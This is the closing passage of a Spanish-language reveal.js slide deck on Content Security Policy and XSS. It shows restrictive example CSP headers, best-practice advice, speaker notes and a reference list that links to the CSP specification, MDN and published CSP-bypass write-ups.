          </small>
        </p>
      </section>

      <section>
        <h2>Empieza con una política restrictiva</h2>
        <pre class=""><code data-trim data-noescape class="http">
          Content-Security-Policy:
            default-src 'none';
            base-uri 'none';
            form-action 'none';
            frame-ancestors 'none';
        </code></pre>
      </section>

      <section>
        <h2>Usa un nonce para scripts</h2>
        <pre class=""><code data-trim data-noescape class="http">
          Content-Security-Policy:
            default-src 'none';
            script-src 'nonce-8IBTHwOdqNKAWeKl7plt8g==';
            base-uri 'none';
            form-action 'none';
            frame-ancestors 'none';
        </code></pre>
      </section>

      <section>
        <h2>Una buena política</h2>

        <ul>
          <li>
            Usa una lista muy específica de hosts y paths permitidos
          </li>
          <li>
            Nunca uses <code>'unsafe-inline'</code> y evita usar <code>'unsafe-eval'</code>
          </li>
          <li>
            Evita usar librerías que permiten ejecutar código JS fuera de tu control
          </li>
          <li>En lo posible crea reglas para las páginas que las requieran, no todo el sitio</li>
        </ul>
      </section>

      <section>
        <h2>
          Conclusión
        </h2>

        <p>
          CSP es una capa de seguridad adicional, no una solución mágica para prevenir todo tipo de ataques.
        </p>

        <p>
          Bypassear políticas CSP es una nueva habilidad que debemos aprender,
          y también otras maneras creativas de explotación sin ejecutar JavaScript.
        </p>
      </section>

      <section data-transition="zoom">
        <h3>
          CSP es una capa de seguridad adicional, no una solución mágica
        </h3>
        <p>
          Aprende, entiende, y comparte
        </p>

        <img src="img/qr.png" class="r-stretch">

        <footer>
          <p>
            <small>
              <a href="" class="go-to-next-slide">
                Referencias y recursos
                <i class="fa-regular fa-bookmark"></i>
                <i class="fa-solid fa-link"></i>
              </a>
              <br>
              <br>
              <a href="https://github.com/stsewd/charla-csp-xss" target="_blank">
                <span>
                  Código fuente <i class="fas fa-code-branch"></i>
                </span>
                <br />
                <span>https://github.com/stsewd/charla-csp-xss</span>
              </a>
            </small>
          </p>

          <p>
            <small>
              @stsewd
              <a href="http://github.com/stsewd" target="_blank"><i class="fab fa-github"></i></a>
              <a href="http://twitter.com/stsewd" target="_blank"><i class="fab fa-twitter"></i></a>
              -
              <a href="https://stsewd.dev" target="_blank">https://stsewd.dev</a>
            </small>
          </p>
        </footer>

        <aside class="notes">
          Ahí les dejo el enlace a esta presentación y a mi blog donde a veces escribo cosas. y también estan las
          vulnerabilidades

          Eso fue todo por hoy, espero hayan aprendido algo nuevo. Ahora vamos a las
          preguntas. Si algo no se entendió, es probablemente mi culpa, no lo expliqué
          bien, así que siéntanse libres de preguntar algo incluso si ya lo
          di en la presentación, y lo voy a tratar de aclarar.

          En mi blog también pueden encontrar una lista de las vulnerabilidades
          públicas que reportado, podemos hablar sobre eso más luego si desean.
        </aside>
      </section>

      <section>
        <div>
          <h2>Referencias y recursos</h2>
          <small>
            <ul>
              <li>
                <a href="examples/" target="_blank">Ejemplos interactivos</a>
              </li>
              <li>
                Especificación oficial de CSP:
                <a href="https://www.w3.org/TR/CSP3/" target="_blank">
                  https://www.w3.org/TR/CSP3/
                </a>
              </li>
              <li>
                Recursos de MDN:
                <ul>
                  <li>
                    <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP" target="_blank">
                      https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
                    </a>
                  </li>
                  <li>
                    <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy"
                      target="_blank">
                      https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy
                    </a>
                  </li>
                  <li>
                    <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/Sources "
                      target="_blank">
                      https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/Sources
                    </a>
                  </li>
                </ul>
              </li>
              <li>
                Guía rápida:
                <a href="https://content-security-policy.com/" target="_blank">
                  https://content-security-policy.com/
                </a>
              </li>
              <li>
                Evaluador de CSP de Google:
                <a href="https://csp-evaluator.withgoogle.com/" target="_blank">
                  https://csp-evaluator.withgoogle.com/
                </a>
              </li>
              <li>
                Blog posts y guías sobre bypasses de CSP:
                <ul>
                  <li>
                    <a href="https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/"
                      target="_blank">
                      https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/
                    </a>
                  </li>
                  <li>
                    <a href="https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass"
                      target="_blank">
                      https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass
                    </a>
                  </li>
                  <li>
                    <a href="https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/" target="_blank">
                      https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/
                    </a>
                  </li>
                  <li>
                    <a href="https://portswigger.net/research/angularjs-csp-bypass-in-56-characters" target="_blank">
                      https://portswigger.net/research/angularjs-csp-bypass-in-56-characters
                    </a>
                  </li>
                  <li>
                    <a href="https://www.slideshare.net/slideshow/breaking-bad-csp/62946744" target="_blank">
                      https://www.slideshare.net/slideshow/breaking-bad-csp/62946744
                    </a>
                  </li>
                </ul>
              </li>
              <li>
                Otros vectores de ataque:
                <ul>
                  <li>
                    <a href="https://homakov.blogspot.com/2014/01/using-content-security-policy-for-evil.html"
                      target="_blank">
                      https://homakov.blogspot.com/2014/01/using-content-security-policy-for-evil.html
                    </a>
                  </li>
                  <li>
                    <a href="https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp"
                      target="_blank">
                      https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp
                    </a>
                  </li>
                  <li>
                    <a href="https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection"
                      target="_blank">
                      https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection
                    </a>
                  </li>
                </ul>
              </li>
            </ul>
          </small>
        </div>
      </section>
    </div>
  </div>

  <script src="node_modules/reveal.js/dist/reveal.js"></script>
  <script src="node_modules/reveal.js/plugin/notes/notes.js"></script>
  <script src="node_modules/reveal.js/plugin/markdown/markdown.js"></script>
  <script src="node_modules/reveal.js/plugin/search/search.js"></script>
  <script src="node_modules/reveal.js/plugin/zoom/zoom.js"></script>
  <script src="node_modules/reveal.js/plugin/highlight/highlight.js"></script>
  <script>
    // More info about initialization & config:
    // - https://revealjs.com/initialization/
    // - https://revealjs.com/config/
    Reveal.initialize({
      hash: true,
      maxScale: 1,
      width: 1060,
      height: 800,
      // Learn about plugins: https://revealjs.com/plugins/
      plugins: [RevealMarkdown, RevealHighlight, RevealNotes, RevealSearch, RevealZoom]
    });
  </script>
</body>

</html>
